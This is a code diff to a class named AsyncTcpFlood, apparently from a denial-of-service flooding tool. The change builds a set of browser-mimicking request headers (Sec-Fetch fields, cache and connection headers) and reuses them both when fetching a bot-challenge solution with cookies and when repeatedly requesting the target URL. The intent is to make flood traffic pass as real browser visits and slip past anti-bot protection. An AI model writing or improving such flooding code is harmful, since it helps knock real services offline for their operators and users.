@@ -450,6 +450,17 @@ class AsyncTcpFlood(FloodBase):
         cl_timeout = aiohttp.ClientTimeout(
             connect=self._settings.connect_timeout_seconds, total=30)
         conn_id = str(uuid.uuid4())
+        headers = {
+            "User-Agent": user_agent,
+            "Accept-Encoding": "gzip, deflate",
+            'Cache-Control': 'max-age=0',
+            'Connection': 'Keep-Alive',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'none',
+            'Sec-Fetch-User': '?1',
+            'Pragma': 'no-cache',
+        }
         async with aiohttp.ClientSession(
             connector=connector,
             timeout=cl_timeout,
@@ -462,12 +473,7 @@ class AsyncTcpFlood(FloodBase):
                 # respect to only a few parameters we control for
                 async with s.get(
                     solver.path,
-                    # XXX: more headers
-                    headers={
-                        "User-Agent": user_agent,
-                        "Accept": "application/json",
-                        "Accept-Encoding": "gzip, deflate"
-                    },
+                    headers= headers,
                 ) as response:
                     payload = dict(await response.json())
                     if not "cn" in payload:
@@ -476,15 +482,13 @@ class AsyncTcpFlood(FloodBase):
                 self._connections.add(conn_id)
             else:
                 (latest_ts, user_agent, cookies) = cached_cookies
+                headers["User-Agent"] = user_agent
             s.cookie_jar.update_cookies(cookies)
             for ind in range(solver.MAX_RPC):
                 if time.time() > latest_ts: break
                 async with s.get(
                     self._url.human_repr(),
-                    # XXX: more headers
-                    headers = {
-                        "User-Agent": user_agent,
-                    },
+                    headers = headers,
                 ) as response:
                     self._connections.add(conn_id)
                     if on_connect and not on_connect.done():
